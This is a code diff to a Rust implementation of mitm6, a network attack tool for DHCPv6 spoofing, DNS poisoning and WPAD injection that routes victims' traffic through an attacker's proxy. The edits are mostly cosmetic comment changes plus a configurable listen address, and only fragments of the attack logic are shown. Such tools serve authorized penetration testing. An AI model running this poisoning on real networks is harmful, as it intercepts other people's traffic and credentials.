@@ -1,4 +1,4 @@
-//! mitm6 — DHCPv6 DNS Poisoning + WPAD Injection + DNS Spoofing
+﻿//! mitm6 — DHCPv6 DNS Poisoning + WPAD Injection + DNS Spoofing
 //!
 //! Implements full IPv6 attack chain:
 //! 1. **DHCPv6 spoofing**: Replies to DHCPv6 Solicit/Request with attacker's
@@ -26,9 +26,9 @@ use tokio::sync::watch;
 use tokio::time::{Duration, sleep};
 use tracing::{debug, info};
 
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 // DHCPv6 Constants
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 
 /// DHCPv6 client port
 const DHCPV6_CLIENT_PORT: u16 = 546;
@@ -54,9 +54,9 @@ const OPTION_DOMAIN_LIST: u16 = 24;
 // DNS constants
 const DNS_PORT: u16 = 53;
 
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 // Configuration
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 
 /// Configuration for mitm6 DHCPv6 poisoning
 #[derive(Debug, Clone)]
@@ -97,9 +97,9 @@ impl Default for Mitm6Config {
     }
 }
 
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 // DHCPv6 Poisoner
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 
 /// DHCPv6-based DNS poisoning engine.
 /// Runs on `tokio` — the listener loop is spawned as a background `tokio::task`,
@@ -254,7 +254,7 @@ impl Mitm6 {
     /// Start the WPAD HTTP server component.
     /// Serves malicious proxy configuration to route victim traffic.
     async fn start_wpad_server(&self) -> Result<tokio::task::JoinHandle<()>, RelayError> {
-        let listen_addr = format!("0.0.0.0:{}", self.config.wpad_http_port);
+        let listen_addr = crate::utils::format_addr(&self.config.listen_ip, self.config.wpad_http_port);
         let listener = TcpListener::bind(&listen_addr).await.map_err(|e| {
             RelayError::Socket(format!(
                 "Cannot bind WPAD HTTP port {}: {e}",
@@ -351,9 +351,9 @@ impl Drop for Mitm6 {
     }
 }
 
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 // DHCPv6 Packet Handling
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 
 async fn handle_dhcpv6_packet(
     data: &[u8],
@@ -418,9 +418,9 @@ async fn send_dhcpv6_response(
     Ok(())
 }
 
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 // DNS Spoofing
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 
 async fn handle_dns_query(
     data: &[u8],
@@ -578,9 +578,9 @@ fn encode_dns_name(buf: &mut Vec<u8>, domain: &str) {
     buf.push(0); // Root label
 }
 
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 // WPAD Proxy Configuration
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 
 /// Build the WPAD proxy auto-configuration (PAC) file content.
 /// This routes all HTTP/HTTPS traffic through the attacker's proxy.
@@ -604,9 +604,9 @@ fn build_wpad_dat(config: &Mitm6Config) -> String {
     )
 }
 
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 // DHCPv6 Packet Builders
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 
 fn build_spoofed_advertise(tx_id: &[u8; 3], config: &Mitm6Config) -> Vec<u8> {
     let mut pkt = Vec::new();
